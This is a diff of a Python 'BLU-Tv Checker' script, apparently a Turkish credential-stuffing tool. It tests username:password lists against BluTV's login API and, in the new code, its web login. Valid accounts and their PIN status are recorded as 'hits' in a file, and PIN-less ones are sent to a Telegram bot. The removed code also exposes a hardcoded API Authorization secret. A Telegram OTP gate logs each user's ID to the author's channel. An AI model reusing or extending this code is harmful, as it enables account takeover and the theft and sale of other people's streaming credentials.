@@ -126,30 +126,62 @@ def checker():
             quit()
             exit()
     try:
-        if 3 > len(open("/sdcard/.andorid-auth","r").read()):
-            print("\n @owyuxbot Tan Gelecek Kod")
-            chat=str(input("\nTelegram ID Gir: "))
-            kod9="".join(random.choice("1234567890")for i in range(7))
-            kod99=kod9
-            kod9=f""" 
+        try:
+            if 3 > len(open("/sdcard/.andorid-auth","r").read()):
+                print("\n @owyuxbot Tan Gelecek Kod")
+                chat=str(input("\nTelegram ID Gir: "))
+                kod9="".join(random.choice("1234567890")for i in range(7))
+                kod99=kod9
+                kod9=f""" 
 📵 OTP Verification 📵
-    
+        
 Kod: {kod9}
-    
+        
 ⚠️ Please Dont Share ⚠️
 """
-            kodq=requests.get(f"https://api.telegram.org/bot{tokens}/sendMessage?chat_id={chat}&text={kod9}").text
-            kod2=str(input("\nBottan Gelen Kodu Giriniz: "))
-            if kod2 == kod99:
-                open("/sdcard/.andorid-auth","w").write(chat)
-                ms=f"🔱 New Login Detect: \nℹ️ ID: {chat}"
-                requests.get(f"https://api.telegram.org/bot{tokens}/sendMessage?chat_id={logch}&text={ms}").text
-                clear()
-                banner()
-            else:
-                print("Girilen OTP Yanlış")
-                quit()
-                exit()
+                kodq=requests.get(f"https://api.telegram.org/bot{tokens}/sendMessage?chat_id={chat}&text={kod9}").text
+                kod2=str(input("\nBottan Gelen Kodu Giriniz: "))
+                if kod2 == kod99:
+                    try:
+                        open("/sdcard/.andorid-auth","w").write(chat)
+                    except:
+                        open("/sdcard/andorid-auth","w").write(chat)
+                    ms=f"🔱 New Login Detect: \nℹ️ ID: {chat}"
+                    requests.get(f"https://api.telegram.org/bot{tokens}/sendMessage?chat_id={logch}&text={ms}").text
+                    clear()
+                    banner()
+                else:
+                    print("Girilen OTP Yanlış")
+                    quit()
+                    exit()
+        except:
+            if 3 > len(open("/sdcard/.andorid-auth","r").read()):
+                print("\n @owyuxbot Tan Gelecek Kod")
+                chat=str(input("\nTelegram ID Gir: "))
+                kod9="".join(random.choice("1234567890")for i in range(7))
+                kod99=kod9
+                kod9=f""" 
+📵 OTP Verification 📵
+        
+Kod: {kod9}
+        
+⚠️ Please Dont Share ⚠️
+"""
+                kodq=requests.get(f"https://api.telegram.org/bot{tokens}/sendMessage?chat_id={chat}&text={kod9}").text
+                kod2=str(input("\nBottan Gelen Kodu Giriniz: "))
+                if kod2 == kod99:
+                    try:
+                        open("/sdcard/.andorid-auth","w").write(chat)
+                    except:
+                        open("/sdcard/andorid-auth","w").write(chat)
+                    ms=f"🔱 New Login Detect: \nℹ️ ID: {chat}"
+                    requests.get(f"https://api.telegram.org/bot{tokens}/sendMessage?chat_id={logch}&text={ms}").text
+                    clear()
+                    banner()
+                else:
+                    print("Girilen OTP Yanlış")
+                    quit()
+                    exit()
     except:
         print("\n @owyuxbot Tan Gelecek Kod")
         chat=str(input("\nTelegram ID Gir: "))
@@ -165,7 +197,10 @@ Kod: {kod9}
         kodq=requests.get(f"https://api.telegram.org/bot{tokens}/sendMessage?chat_id={chat}&text={kod9}").text
         kod2=str(input("\nBottan Gelen Kodu Giriniz: "))
         if kod2 == kod99:
-            open("/sdcard/.andorid-auth","w").write(chat)
+            try:
+                open("/sdcard/.andorid-auth","w").write(chat)
+            except:
+                open("/sdcard/andorid-auth","w").write(chat)
             ms=f"🔱 New Login Detect: \nℹ️ ID: {chat}"
             requests.get(f"https://api.telegram.org/bot{tokens}/sendMessage?chat_id={logch}&text={ms}").text
             clear()
@@ -883,59 +918,6 @@ Kod: {kod9}
     def chkblu():
         clear()
         banner()
-        
-        def ver():
-                veri=(
-        "11.0.1",
-        "11.0.2",
-        "11.0.3",
-        "11.1.1",
-        "11.1.2",
-        "11.2.1",
-        "11.2.2",
-        "11.2.5",
-        "11.2.6",
-        "11.3.1",
-        "11.4.1",
-        "12.0.1",
-        "12.1.1",
-        "12.1.2",
-        "12.1.3",
-        "12.1.4",
-        "12.3.1",
-        "12.4.1",
-        "12.4.2",
-        "12.4.3",
-        "12.4.4",
-        "12.4.5",
-        "12.4.6",
-        "12.4.7",
-        "12.4.8",
-        "12.4.9",
-        "12.5.1",
-        "12.5.2",
-        "12.5.3",
-        "12.5.4",
-        "12.5.5",
-        "13.1.1",
-        "13.1.2",
-        "13.1.3",
-        "13.2.2",
-        "13.2.3",
-        "13.3.1",
-        "13.4.1",
-        "13.5.1",
-        "13.6.1",
-        "14.0.1",
-        "14.4.1",
-        "14.4.2",
-        "14.5.1",
-        "14.7.1",
-        "15.0.1",
-        "15.0.2",
-        "15.2.1",
-        "15.3.1",
-    )
         def bsl(mp):
                 try:
                     mp=mp.replace("\n","")
@@ -944,64 +926,50 @@ Kod: {kod9}
                     toplam=0
                     olu=0
                     hit=0
-                    HEA={
-                        "Host":"adapter.blupoint.io",
-                        "DeviceName":"iPhone",
-                        "Authorization":"Basic 5d36e6c40780020024687002:cE8vwiQrAULRGZ6ZqqXgtztqFgWRU7o6",
-                        "Accept":"*/*",
-                        "AppVersion":"6.9.2",
-                        "CaptchaToken":"",
-                        "Accept-Language":"tr-TR",
-                        "DeviceResolution":"1920x1080",
-                        "Cache-Control":"no-cache",
-                        "DeviceId":str(uuid.uuid4()),
-                        "User-Agent":"BluTV/6.9.2 (com.dsmart.D-Smart-BLU-iPhone; build:1; iOS "+str(ver())+") Alamofire/5.4.4",
-                        "Connection":"keep-alive",
-                        "AppPlatform":"com.blu.phone.iphone",
-                        "Content-Type":"application/json",
-                        "AuthorizationToken":"",
-                            }
-                    datam={"password":pas,"username":user}
-                    url="https://adapter.blupoint.io/api/projects/5d2dc68a92f3636930ba6466/mobile/login?key=GdMUoXLZmhWGE60APBOF_A&expires=1642535526"
-                    try:
-                        veri=requests.post(url, headers=HEA, data=json.dumps(datam)).text
-                    except KeyError:
-                        print("ip Ban Yedin: 10 Saniye Bekleniyor ...")
-                        time.sleep(10)
-                    if '","subscriptionStatus":"active"' in veri:
-                        say=0
-                        pin=""
-                        for i in veri.split('has_pin":'):
-                            if not say ==0:
-                                if pin =="":
-                                    pin=pin+(i.split(',')[0])
-                                else:
-                                    pin=pin+'/'+(i.split(',')[0])
-                            say=say+1
-                            pins=""
-                            pins=(pin.upper().replace('TRUE','PinVar').replace('FALSE','PinYok'))
-                            enddate=veri.split('subscriptionExpireDate":"')[1].split('"')[0]
-                            if "PinYok" in str(pins):
+                    client=requests.session()
+                    headers={
+                    "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
+                    "content-type": "text/plain;charset=UTF-8",
+                    "origin": "https://www.blutv.com",
+                    "referer": "https://www.blutv.com/giris",
+                    "Connection":"keep-alive"
+                    
+                    }
+                    
+                    data={
+                    "remember": "false",
+                    "username": user,
+                    "password": pas
+                    }
+                    
+                    login = client.post('https://www.blutv.com/api/login',data=json.dumps(data),headers=headers)
+                    if "token" in login.text:
+                        cap=client.get("https://www.blutv.com/int/hesabim").text
+                        if 'variant_name' in cap:
+                            say=0
+                            pin=""
+                            if cap.count('hasPin":true') ==0:
                                 pins="Pinsiz"
                             else:
-                                pins="Hepsi Pinli"
-                        ms="""
+                                pins=cap.count('hasPin":true')
+                            ms="""
 ╭─➢ ☄ ZET| BLU-Tv Checker ☄
 ├◉[Gmail]➢ """+str(user)+"""
 ├◉[Pass]➢ """+str(pas)+"""
-├◉[Pin]➢ """+str(pins)+"""
-├◉[Tarih]➢ """+str(enddate)+"""
+├◉[Pin]➢ """+str(pins)+""" Profil
 ╰─◉➤ Telegram Channel: @ZetTekno\n
-        """
-                        print(ms)
-                        if pins=="Pinsiz":
-                            try:
-                                tele=open("tele","r").read()
-                                idm=open("idm","r").read()
-                                requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={idm}&text={ms}")
-                            except:
-                                pass
-                        open(cihaz+"hit-BlUTv.txt","a").write(ms)
+"""
+                            print(ms)
+                            if pins=="Pinsiz":
+                                try:
+                                    tele=open("tele","r").read()
+                                    idm=open("idm","r").read()
+                                    requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={idm}&text={ms}")
+                                except:
+                                    pass
+                            open(cihaz+"hit-BlUTv.txt","a").write(ms)
+                        else:
+                            print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
                     else:
                         print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
                 except:
